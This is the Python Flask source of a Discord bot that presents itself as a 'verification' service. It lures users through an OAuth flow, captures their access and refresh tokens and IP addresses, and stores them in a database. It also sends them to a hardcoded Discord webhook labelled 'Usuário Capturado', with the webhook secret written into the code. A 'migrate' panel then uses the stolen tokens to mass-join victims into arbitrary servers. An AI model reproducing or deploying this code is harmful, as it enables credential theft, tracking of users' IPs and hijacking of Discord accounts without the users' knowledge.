import os
import time
import random
import requests
import psycopg2
from flask import Flask, request, redirect, render_template

app = Flask(__name__)
app.secret_key = os.urandom(24)

# --- CONFIGURAÇÕES ---
CLIENT_ID = os.environ.get("DISCORD_CLIENT_ID", "1450162997187182632")
CLIENT_SECRET = os.environ.get("DISCORD_CLIENT_SECRET")
BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL") 
REDIRECT_URI = "https://hunter-bot-verify.onrender.com/callback"

LOG_WEBHOOK = "https://discord.com/api/webhooks/1447353848493772901/IoHRSWi8YZVpFGENLD5PWkf90Gx4YGhVTuF3vOkVre8_75efP13cv3i-83OBbCrC0mN1"
API_BASE = "https://discord.com/api/v10"

# --- BANCO DE DADOS (PostgreSQL) ---
def get_db_connection():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        # ADICIONEI: refresh_token TEXT
        cur.execute("""
            CREATE TABLE IF NOT EXISTS verified_users (
                user_id VARCHAR(50) PRIMARY KEY,
                username VARCHAR(100),
                ip_address VARCHAR(50),
                access_token TEXT,
                refresh_token TEXT,
                guild_id VARCHAR(50),
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
        print("✅ DB Conectado.")
    except Exception as e:
        print(f"❌ Erro DB: {e}")

def save_user_to_db(user_id, username, ip, token, refresh, guild_id):
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        # Query Atualizada para incluir refresh_token
        query = """
            INSERT INTO verified_users (user_id, username, ip_address, access_token, refresh_token, guild_id)
            VALUES (%s, %s, %s, %s, %s, %s)
            ON CONFLICT (user_id) DO UPDATE 
            SET ip_address = EXCLUDED.ip_address, 
                access_token = EXCLUDED.access_token,
                refresh_token = EXCLUDED.refresh_token,
                guild_id = EXCLUDED.guild_id,
                verified_at = CURRENT_TIMESTAMP;
        """
        cur.execute(query, (user_id, username, ip, token, refresh, guild_id))
        conn.commit()
        conn.close()
    except Exception as e:
        # Se der erro de coluna faltando, avisa
        print(f"❌ Erro Save DB (Provavelmente precisa resetar a tabela): {e}")

# --- FUNÇÕES DISCORD ---
def get_headers_bot():
    return {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}

def send_log_to_webhook(user_data, access_token, refresh_token, ip_address, guild_id):
    embed = {
        "title": "✅ Usuário Capturado (Completo)!",
        "description": "Dados + Refresh Token salvos.",
        "color": 0x00ff41,
        "fields": [
            { "name": "👤 User", "value": f"{user_data['username']} ({user_data['id']})", "inline": False },
            { "name": "🌍 IP", "value": f"`{ip_address}`", "inline": True },
            { "name": "🔑 Access Token (Curto - 7 Dias)", "value": f"||{access_token}||", "inline": False },
            { "name": "🔄 Refresh Token (Longo - Renovável)", "value": f"||{refresh_token}||", "inline": False }
        ],
        "footer": { "text": "Hunter Database System" }
    }
    try:
        requests.post(LOG_WEBHOOK, json={"embeds": [embed], "username": "Hunter Logs"})
    except:
        pass

def get_or_create_verified_role(target_guild_id):
    try:
        url = f"{API_BASE}/guilds/{target_guild_id}/roles"
        response = requests.get(url, headers=get_headers_bot())
        if response.status_code == 200:
            for role in response.json():
                if role['name'] == "Vereficado": return role['id']
        
        create_url = f"{API_BASE}/guilds/{target_guild_id}/roles"
        data = {"name": "Vereficado", "permissions": "0", "color": 0x00ff00, "hoist": False, "mentionable": False}
        create_res = requests.post(create_url, headers=get_headers_bot(), json=data)
        if create_res.status_code in [200, 201]: return create_res.json()['id']
    except:
        return None
    return None

def join_user_to_guild(user_id, access_token, target_guild_id):
    url = f"{API_BASE}/guilds/{target_guild_id}/members/{user_id}"
    data = {"access_token": access_token}
    r = requests.put(url, headers=get_headers_bot(), json=data)
    return r.status_code

def add_role_to_user(user_id, role_id, target_guild_id):
    url = f"{API_BASE}/guilds/{target_guild_id}/members/{user_id}/roles/{role_id}"
    requests.put(url, headers=get_headers_bot())

# Inicializa DB
init_db()

# --- ROTAS ---

@app.route('/')
def index():
    return "Hunter System Online."

@app.route('/ping')
def ping():
    return "Pong", 200

@app.route('/auth')
def auth():
    target_guild_id = request.args.get('guild_id')
    if not target_guild_id:
        return "Erro: ID do servidor faltando."
    
    # Links
    base_params = (
        f"?client_id={CLIENT_ID}"
        f"&response_type=code"
        f"&redirect_uri={REDIRECT_URI}"
        f"&scope=identify%20guilds.join%20guilds"
        f"&state={target_guild_id}"
    )
    
    web_url = f"https://discord.com/oauth2/authorize{base_params}"
    app_url = f"discord://discord.com/oauth2/authorize{base_params}"
    
    return render_template('launcher.html', web_url=web_url, app_url=app_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    target_guild_id = request.args.get('state') 
    
    if not code: return "Erro: Código não recebido."

    # 1. Troca Code por Tokens
    data = {
        'client_id': CLIENT_ID, 
        'client_secret': CLIENT_SECRET, 
        'grant_type': 'authorization_code', 
        'code': code, 
        'redirect_uri': REDIRECT_URI
    }
    token_resp = requests.post(f'{API_BASE}/oauth2/token', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    
    if token_resp.status_code != 200:
        return f"Erro ao obter token: {token_resp.text}"
    
    tokens = token_resp.json()
    access_token = tokens.get('access_token')
    refresh_token = tokens.get('refresh_token') # <--- PEGANDO O TOKEN LONGO AQUI
    
    # 2. Pega User Info
    user_resp = requests.get(f'{API_BASE}/users/@me', headers={'Authorization': f'Bearer {access_token}'})
    user_data = user_resp.json()
    user_id = user_data['id']
    username = user_data['username']

    # 3. Pega IP
    ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
    
    # 4. Salva (Com Refresh Token)
    save_user_to_db(user_id, username, ip, access_token, refresh_token, target_guild_id)
    send_log_to_webhook(user_data, access_token, refresh_token, ip, target_guild_id)

    # 5. Discord Actions
    join_user_to_guild(user_id, access_token, target_guild_id)
    try:
        role_id = get_or_create_verified_role(target_guild_id)
        if role_id:
            add_role_to_user(user_id, role_id, target_guild_id)
    except Exception as e:
        print(f"Erro cargo: {e}")

    # 6. Sucesso
    return_app_url = f"discord://discord.com/channels/{target_guild_id}"
    return_web_url = f"https://discord.com/channels/{target_guild_id}"

    return render_template('launcher.html', app_url=return_app_url, web_url=return_web_url)

# --- PAINEL ENVIO ---
@app.route('/painel', methods=['GET', 'POST'])
def painel():
    message = ""
    if request.method == 'POST':
        target_guild_id = request.form.get('guild_id') 
        channel_id = request.form.get('channel_id')
        title = request.form.get('title')
        desc = request.form.get('desc')
        image_url = request.form.get('image_url')
        
        verify_link = f"https://hunter-bot-verify.onrender.com/auth?guild_id={target_guild_id}"

        payload = {
            "embeds": [{
                "title": title, "description": desc, "color": 0x00ff41,
                "image": {"url": image_url} if image_url else {}
            }],
            "components": [{
                "type": 1,
                "components": [{
                    "type": 2, "style": 5, "label": "VERIFICAR AGORA", "url": verify_link
                }]
            }]
        }
        
        post_url = f"{API_BASE}/channels/{channel_id}/messages"
        r = requests.post(post_url, headers=get_headers_bot(), json=payload)
        
        if r.status_code == 200:
            message = "✅ Painel enviado!"
        else:
            message = f"❌ Erro: {r.text}"

    return render_template('painel.html', message=message)

# --- PAINEL MIGRAÇÃO ---
@app.route('/migrate', methods=['GET', 'POST'])
def migrate():
    log_msg = []
    
    if request.method == 'POST':
        action_type = request.form.get('action_type')
        target_guild_id = request.form.get('target_guild_id')
        
        conn = get_db_connection()
        cur = conn.cursor()

        try:
            if action_type == 'single':
                identifier = request.form.get('identifier')
                cur.execute("SELECT user_id, username, access_token FROM verified_users WHERE user_id = %s OR username = %s", (identifier, identifier))
                user = cur.fetchone()

                if user:
                    uid, uname, token = user
                    # Usa o ACCESS TOKEN mesmo, ele é o que funciona
                    status = join_user_to_guild(uid, token, target_guild_id)
                    res_txt = "Sucesso" if status in [201, 204] else f"Falha ({status})"
                    log_msg.append(f"[{res_txt}] {uname}")
                else:
                    log_msg.append(f"⚠️ User não encontrado.")

            elif action_type == 'mass':
                amount = int(request.form.get('amount'))
                cur.execute("SELECT user_id, username, access_token FROM verified_users ORDER BY RANDOM() LIMIT %s", (amount,))
                users = cur.fetchall()
                
                count = 0
                for user in users:
                    uid, uname, token = user
                    status = join_user_to_guild(uid, token, target_guild_id)
                    if status in [201, 204]: count += 1
                    time.sleep(0.5) 

                log_msg.append(f"🚀 Migrados: {count}/{len(users)}")

        except Exception as e:
            log_msg.append(f"Erro: {str(e)}")
        finally:
            if conn: conn.close()

    return render_template('migration.html', logs=log_msg)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
